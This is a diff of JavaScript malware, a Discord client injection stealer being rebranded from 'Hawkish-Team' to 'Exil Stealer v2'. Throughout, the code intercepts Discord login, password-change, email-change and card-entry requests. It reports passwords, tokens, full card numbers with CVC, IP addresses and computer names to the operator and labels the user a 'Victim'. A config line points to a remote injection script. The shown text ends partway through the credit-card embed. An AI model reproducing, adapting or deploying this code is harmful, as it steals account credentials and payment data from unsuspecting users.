@@ -15,7 +15,7 @@ var config = {
     "logout": "true",
     "logout-notify": "true",
     "init-notify": "true",
-    "embed-color": 16734976,
+    "embed-color": 138,
 
     creator: "Exil V2",
     injection_url: "https://raw.githubusercontent.com/ItsZxsko/tenpls-/main/index.js",
@@ -65,8 +65,8 @@ const makeEmbed = async ({
     description
 }) => {
     var params = {
-        username: "Hawkish-Team",
-        avatar_url: "https://raw.githubusercontent.com/Hawkishx/assets/main/hawkish.png",
+        username: "Exil V2",
+        avatar_url: "https://i.imgur.com/8QlcHuh.png",
         content: "",
         embeds: [{
             title: title,
@@ -74,11 +74,11 @@ const makeEmbed = async ({
             fields: fields,
             description: description ?? "",
             author: {
-                name: `Hawkish-Team`
+                name: `Exil Stealer v2`
             },
             
             footer: {
-                text: `©[${config.creator}] | https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook`
+                text: `${config.creator} | https://t.me/exilstealer`
             },
 
         }]
@@ -144,7 +144,7 @@ const GetA2F = (bouki) => {
         case false:
             return ":lock: `A2F Not Enabled`"
         default:
-            return "Idk bro you got me"
+            return "hm.... idk"
     }
 }
 
@@ -289,9 +289,9 @@ const post = async (params) => {
 const FirstTime = async () => {
     var token = await execScript(tokenScript)
     if (config['init-notify'] !== "true") return true
-    if (fs.existsSync(__dirname + "/Hawkish")){
+    if (fs.existsSync(__dirname + "/Exil")){
         try{
-        fs.rmdirSync(__dirname + "/Hawkish")
+        fs.rmdirSync(__dirname + "/Exil")
         }catch(err){
             console.log(err)
         }
@@ -299,12 +299,7 @@ const FirstTime = async () => {
     var client_discord = await getDiscordClientFolder()
     if (!token) {
         var params = await makeEmbed({
-            title: "Exil Stealer v2",
-            fields: [{
-                name: "Injection Info",
-                value: `\`\`\`diff\n- Computer Name: ${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
-                inline: !1
-            }]
+            title: "Exil Stealer v2"
         })
     } else {
         var user = await getURL("https://discord.com/api/v8/users/@me", token)
@@ -314,14 +309,13 @@ const FirstTime = async () => {
 
         var Billings = parseBilling(billing)
         var Friends = parseFriends(friends)
-        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Hawkishx/assets/main/ghost.png"
-        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Hawkishx/assets/main/banner.gif"
+        if (!user.avatar) var userAvatar = "https://i.imgur.com/8QlcHuh.png"
+        if (!user.banner) var userBanner = "https://i.imgur.com/8QlcHuh.png"
 
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
         var params = await makeEmbed({
-            title: " Hawkish-Team Initialized",
-            description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
+            title: "Exil Initialized",
             fields: [{
             }, {
               name: "Computer Name:",
@@ -364,10 +358,6 @@ const FirstTime = async () => {
                 value: `${GetA2F(user.mfa_enabled)}`,
                 inline: !1
             }, {
-                name: "@Copyright",
-                value: `[Hawkish-Team 2023 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook)`,
-                inline: !1
-            }, {
                 name: "Billing <a:billing:1041641103629234196>",
                 value: `${Billings}`,
                 inline: !1
@@ -401,12 +391,7 @@ const FirstTime = async () => {
     if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
         if (!token) {
             var params = await makeEmbed({
-                title: "Hawkish User log out (User not Logged in before)",
-                fields: [{
-                    name: "Injection Info",
-                    value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
-                    inline: !1
-                }]
+                title: "User logged out (User not Logged in before)",
             })
         } else {
             var user = await getURL("https://discord.com/api/v8/users/@me", token)
@@ -416,15 +401,27 @@ const FirstTime = async () => {
 
             var Billings = parseBilling(billing)
             var Friends = parseFriends(friends)
-            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Hawkishx/assets/main/ghost.png"
-            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Hawkishx/assets/main/banner.gif"
+            if (!user.avatar) var userAvatar = "https://i.imgur.com/8QlcHuh.png"
+            if (!user.banner) var userBanner = "https://i.imgur.com/8QlcHuh.png"
             
             userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
             userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
             var params = await makeEmbed({
-                title: "Hawkish Victim got logged out",
-                description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
+                title: "Victim got logged out",
                 fields: [{
+                  }, {
+                    name: "Computer Name:",
+                    value: `\`${computerName}\``,  
+                    inline: !1
+                  }, {
+                      name: "Injection Path:",
+                      value: `\`${client_discord}\``,  
+                      inline: !1
+                    }, {
+                      name: "IP:",
+                      value: `\`${ip}\``,  
+                      inline: !1
+                    }, {
                     name: "Username <:username:1041634536733290596> ",
                     value: `\`${user.username}#${user.discriminator}\``,
                     inline: !0
@@ -451,10 +448,6 @@ const FirstTime = async () => {
                 }, {
                     name: "A2F <a:a2f:1040272766982692885>",
                     value: `${GetA2F(user.mfa_enabled)}`,
-                    inline: !0
-                }, {
-                    name: "@Copyright",
-                    value: `[Hawkish-Team 2023 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook)`,
                     inline: !0
                 }, {
                     name: "Billing <a:billing:1041641103629234196>",
@@ -586,8 +579,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
     var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
-    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Hawkishx/assets/main/ghost.png"
-    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Hawkishx/assets/main/banner.gif"
+    if (!user.avatar) var userAvatar = "https://i.imgur.com/8QlcHuh.png"
+    if (!user.banner) var userBanner = "https://i.imgur.com/8QlcHuh.png"
 
     userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
     userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -600,10 +593,22 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
         case request.url.endsWith("login"):
             var password = data.password
             var params = await makeEmbed({
-                title: "Hawkish User Login",
+                title: "User Login",
                 color: config['embed-color'],
-                description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                 fields: [{
+                }, {
+                    name: "Computer Name:",
+                    value: `\`${computerName}\``,  
+                    inline: !1
+                  }, {
+                      name: "Injection Path:",
+                      value: `\`${client_discord}\``,  
+                      inline: !1
+                    }, {
+                      name: "IP:",
+                      value: `\`${ip}\``,  
+                      inline: !1
+                    }, {
                     name: "Username <:username:1041634536733290596> ",
                     value: `\`${user.username}#${user.discriminator}\``,
                     inline: !0
@@ -630,10 +635,6 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                 }, {
                     name: "A2F <a:a2f:1040272766982692885>",
                     value: `${GetA2F(user.mfa_enabled)}`,
-                    inline: !0
-                }, {
-                    name: "@Copyright",
-                    value: `[Hawkish-Team 2023 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook)`,
                     inline: !0
                 }, {
                     name: "Billing <a:billing:1041641103629234196>",
@@ -681,10 +682,22 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             if (!data.password) return
             if (data.new_password) {
                 var params = await makeEmbed({
-                    title: "Hawkish-Team Detect Password Changed",
+                    title: "Victim Changed His Password",
                     color: config['embed-color'],
-                    description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                     fields: [{
+                    }, {
+                        name: "Computer Name:",
+                        value: `\`${computerName}\``,  
+                        inline: !1
+                      }, {
+                          name: "Injection Path:",
+                          value: `\`${client_discord}\``,  
+                          inline: !1
+                        }, {
+                          name: "IP:",
+                          value: `\`${ip}\``,  
+                          inline: !1
+                        }, {
                         name: "Username <:username:1041634536733290596> ",
                         value: `\`${user.username}#${user.discriminator}\``,
                         inline: !0
@@ -711,10 +724,6 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     }, {
                         name: "A2F <a:a2f:1040272766982692885>",
                         value: `${GetA2F(user.mfa_enabled)}`,
-                        inline: !0
-                    }, {
-                        name: "@Copyright",
-                        value: `[Hawkish-Team 2023 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook)`,
                         inline: !0
                     }, {
                         name: "Billing <a:billing:1041641103629234196>",
@@ -764,10 +773,22 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             }
             if (data.email) {
                 var params = await makeEmbed({
-                    title: "Hawkish-Team Detect Email Changed",
+                    title: "Victim Has Changed His Email",
                     color: config['embed-color'],
-                    description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                     fields: [{
+                    }, {
+                        name: "Computer Name:",
+                        value: `\`${computerName}\``,  
+                        inline: !1
+                      }, {
+                          name: "Injection Path:",
+                          value: `\`${client_discord}\``,  
+                          inline: !1
+                        }, {
+                          name: "IP:",
+                          value: `\`${ip}\``,  
+                          inline: !1
+                        }, {
                         name: "Username <:username:1041634536733290596> ",
                         value: `\`${user.username}#${user.discriminator}\``,
                         inline: !0
@@ -794,10 +815,6 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     }, {
                         name: "A2F <a:a2f:1040272766982692885>",
                         value: `${GetA2F(user.mfa_enabled)}`,
-                        inline: !0
-                    }, {
-                        name: "@Copyright",
-                        value: `[Hawkish-Team 2023 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook)`,
                         inline: !0
                     }, {
                         name: "Billing <a:billing:1041641103629234196>",
@@ -846,7 +863,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             var [CardNumber, CardCVC, month, year] = [data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"]]
 
             var params = await makeEmbed({
-                title: "Hawkish-Team User Credit Card Added",
+                title: "Credit Card Added",
                 description: `
                 **IP:** ${ip}\n\n
                 **Username** <:username:1041634536733290596>\n\`\`\`${user.username}#${user.discriminator}\`\`\`\n
